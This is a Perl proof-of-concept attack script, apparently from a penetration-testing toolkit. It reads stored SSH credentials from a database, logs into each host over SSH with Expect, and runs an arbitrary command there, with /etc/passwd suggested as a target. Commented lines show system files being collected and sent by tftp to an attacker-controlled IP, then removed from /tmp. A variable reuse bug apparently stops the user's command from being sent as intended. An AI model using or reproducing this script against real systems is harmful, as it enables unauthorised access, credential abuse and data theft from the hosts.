#!/usr/bin/env perl
use strict;
use warnings;
use POSIX;
use yaptest;
use Data::Dumper;
use File::Basename;
use Expect;

my $script_name = basename($0);
my $usage = "Usage: $script_name
Proof of concept script that reads SSH creds from the database 
and runs a command on each host.

It uses the PERL Expect module.  It's called 'Expect' in CPAN or
dev-perl/Expect as a gentoo package.

Each host is connected to repeatedly until one of the creds in the
database works, then the command is run and that host is not 
connected to again.  Good for grabbing /etc/passwd for example.

Limitations: It doesn't log output, so TFTP back to yourself
             or run in 'script'.

	     It doesn't blacklist accounts like 'halt' or 'reboot'
	     so use at your own risk.

             It's hard coded to expect the prompt to look a certain
	     way.  It therefore won't work robustly against all
	     hosts.

	     The output is pretty messy.

	     The code is nasty, but should be easy enough to 
	     follow.  Yes, you will probably need to read it.

	     ... err it's a poc.  Edit the source to make it do
	     something useful.

NB: ssh is required to be in the path.  You might want to run a 
    TFTP server.
";

my $command = shift or die $usage;
die $usage if shift;

print "[+]\n";
print "[+] This script will read os_unix creds from the database\n";
print "[+] and run this command on every host: $command\n";
print "[+]\n";
print "[+] Hit CTRL-C within 5 secs to quit.\n";
print "[+]\n";

sleep 5;
my $y = yaptest->new();
my $aref = $y->get_credentials(credential_type_name => "os_unix");
my %done;
my $timeout = 20;
my $debug = 1;
my $tftp_ip = "1.2.3.4"; # replace this with your source IP if you use $tftp_ip below
                         # scp would be much smarter.  left as an exercise for the reader.
my $exploit_fail_pattern = "Permission denied, please try again.";
my $prompt = "assword:"; # ssh's password: prompt
my $accept_ssh_key = "Are you sure you want to continue connecting";
my @success_pattern = ("\$ "); # what post-login prompt looks like.  you might need to change this.

foreach my $row_href (@$aref) {
	my $ip = $row_href->{ip_address};
	my $port = $row_href->{port};
	my $tp = $row_href->{transport_protocol_name};
	my $password = $row_href->{password};
	my $username = $row_href->{username};

	next unless (defined($password));
	next if (defined($done{$ip}) and $done{$ip} == 1);
	my %parser = ();
	print "\n\n##################################################################\n\n";
	print "[+] Trying $username/$password at $ip\n";
	my $command = "ssh $username\@$ip";
	print "[D] COMMAND: $command\n" if $debug;
	my $exp = new Expect;
	$exp->spawn($command) or die "Cannot spawn command: $command\n";
	$exp->log_stdout(1);
	$exp->exp_internal(0);
	
	print "[D]\n[D] STATE 0: Get initial prompt (ssh key accept / password prompt)\n[D]\n";
	my $result = $exp->expect($timeout, $prompt, $exploit_fail_pattern, $accept_ssh_key);

	if ($result == 2) {
		print "ERROR: Bad Logon\n";
		next;
	}

	if ($result == 3) {
		print "\n[D]STATE 1: Need to accept SSH key then wait for password prompt\n[D]\n[D]";
		print "[D] Sending yes\n";
		$exp->send("yes\r"); 
		$result = $exp->expect($timeout, $prompt, $exploit_fail_pattern);
		
		if ($result == 2) {
			print "[E] Bad Logon\n";
			next;
		}
	}
	
	if ($result == 1) {
		print "\n[D] STATE 2: Got password prompt\n[D]\n";
		print "[D] Sending password\n";
		$exp->send("$password\r"); 
		print "\n[D] STATE 3: Correct password?\n[D]\n";
		$result = $exp->expect($timeout, $prompt, @success_pattern);
		
		if ($result == 1) {
			print "[D] Wrong password\n";
		}
		if ($result == 2) {
			print "[D] CORRECT PASSWORD $username/$password!\n";
			$done{$ip} = 1;

			# $exp->send("cd /tmp; uname -a > uname-a-`hostname`.txt; echo put uname-a-`hostname`.txt | tftp $tftp_ip; rm /tmp/uname-a-`hostname`.txt\n");
			# $exp->send("cd /tmp; showrev -p > showrev-p-`hostname`.txt; echo put showrev-p-`hostname`.txt | tftp $tftp_ip; rm /tmp/showrev-p-`hostname`.txt\n");
			# $exp->send("cd /tmp; netstat -na> netstat-na-`hostname`.txt; echo put netstat-na-`hostname`.txt | tftp $tftp_ip; rm /tmp/netstat-na-`hostname`.txt\n");
			# $exp->send("cd /tmp; pkginfo -x > pkginfo-x-`hostname`.txt; echo put pkginfo-x-`hostname`.txt | tftp $tftp_ip; rm /tmp/pkginfo-x-`hostname`.txt\n");
			# $exp->send("cd /tmp; ps -ef> ps-ef-`hostname`.txt; echo put ps-ef-`hostname`.txt | tftp $tftp_ip; rm /tmp/ps-ef-`hostname`.txt\n");
			# $exp->send("cd /tmp; mount > mount-`hostname`.txt; echo put mount-`hostname`.txt | tftp $tftp_ip; rm /tmp/mount-`hostname`.txt\n");
			# $exp->send("ls -ld /\n"); # output is to your terminal only, so remember to save the output somehow
			# $exp->send("cd /etc/dfs; echo put dfstab dfstab-`hostname` | tftp $tftp_ip\n");
			$exp->send("$command\n");
			$exp->expect(undef, @success_pattern); # will wait forever.  put one of these after every 'send' line.
		}
	} else {
		print "\n[E] Didn't get password prompt\n";
	}
	$exp->hard_close;
}
$y->destroy;
